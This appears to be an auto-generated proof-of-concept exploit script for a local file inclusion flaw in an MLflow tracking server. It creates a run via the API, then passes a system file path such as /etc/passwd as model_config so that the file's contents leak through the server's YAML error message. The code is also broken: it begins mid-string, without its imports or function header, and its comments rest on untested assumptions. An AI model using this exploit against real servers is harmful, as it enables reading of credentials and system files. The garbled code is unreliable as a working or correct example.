#!/usr/bin/env python3
# PoC for mlflow (/tmp/bounty_test/mlflow/mlflow)
# Path: lfi-001
# Auto-generated — run with: python3 mlflow-lfi-001-poc.py
#
{target_url.rstrip('/')}/api/2.0/mlflow/runs/log-model"

    # First, we need an active run. Create a run if none exists.
    # For simplicity, we assume there is an active run or we create one.
    # We'll create a run via the API.
    create_run_endpoint = f"{target_url.rstrip('/')}/api/2.0/mlflow/runs/create"
    run_data = {"experiment_id": "0"}  # default experiment
    try:
        req = urllib.request.Request(create_run_endpoint, data=json.dumps(run_data).encode(), headers={"Content-Type": "application/json"})
        with urllib.request.urlopen(req) as resp:
            run_info = json.loads(resp.read().decode())
            run_id = run_info["run"]["info"]["run_id"]
            print(f"[+] Created run with ID: {run_id}")
    except Exception as e:
        print(f"[-] Failed to create run: {e}")
        sys.exit(1)

    # Now send the log_model request with the malicious model_config
    # The model_config parameter is a string path to a YAML file.
    # We set it to the target file (e.g., /etc/passwd). The server will try to open it.
    # The file content will be parsed as YAML, and if it fails, the error message includes the content.
    payload = {
        "run_id": run_id,
        "model_config": file_to_read,
        "flavor": "python_function",  # any flavor works
        "artifact_path": "model"
    }
    try:
        req = urllib.request.Request(endpoint, data=json.dumps(payload).encode(), headers={"Content-Type": "application/json"})
        with urllib.request.urlopen(req) as resp:
            # If successful, the file was valid YAML (unlikely for /etc/passwd)
            print("[+] Request succeeded (unexpected). Response:")
            print(resp.read().decode())
    except urllib.error.HTTPError as e:
        # The server returns an error with the file content in the message
        error_body = e.read().decode()
        print(f"[!] Server returned error {e.code}:")
        print(error_body)
        # The error message contains the file content if YAML parsing failed
        # Extract the file content from the error message
        # The error format: "The provided `model_config` file '<path>' is not a valid YAML file: <yaml error>"
        # The yaml error often includes the problematic content.
        # For /etc/passwd, it will show the first line.
        if "not a valid YAML file" in error_body:
            # The file content is embedded in the YAML error
            print("\n[+] File content extracted from error:")
            # Parse the error message to get the content
            # The YAML error typically shows the line that caused the error.
            # We'll just print the whole error body for simplicity.
            print(error_body)
        else:
            print("[-] Unexpected error format.")
    except Exception as e:
        print(f"[-] Request failed: {e}")
        sys.exit(1)

def main():
    parser = argparse.ArgumentParser(description="MLflow LFI PoC")
    parser.add_argument("target", help="MLflow server URL (e.g., http://localhost:5000)")
    parser.add_argument("--file", default="/etc/passwd", help="File to read (default: /etc/passwd)")
    args = parser.parse_args()

    exploit(args.target, args.file)

if __name__ == "__main__":
    main()
